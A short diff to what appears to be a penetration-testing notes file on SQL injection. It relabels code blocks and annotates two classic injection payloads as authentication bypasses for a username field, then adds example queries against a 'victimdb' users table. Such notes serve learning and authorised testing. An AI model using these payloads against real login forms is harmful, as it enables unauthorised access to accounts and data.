@@ -15,7 +15,7 @@ SQL Injection Vulnerabilities
 
 ## Exploit
 Comments
-```sql
+```
 # MySQL, MariaDB
 -- Oracle
 /* Oracle
@@ -23,12 +23,18 @@ Comments
 ```
 
 SQL Injection Examples
-```bash
-# return all rows from the table
-victor' or 1=1; -- # put in the username field
+```
+# bypass auth (put in the username field)
+victor' or 1=1; -- 
 
-# return the first row in the table
-victor' or 1=1 LIMIT=1; -- # put in the username field
+# bypass auth (put in the username field; the LIMIT keyword might be necessary for some databases)
+victor' or 1=1 LIMIT=1; -- 
+```
+
+SQL Database Query Examples
+```sql
+USE victimdb;
+SELECT * FROM users;
 ```
 
 ## Explore
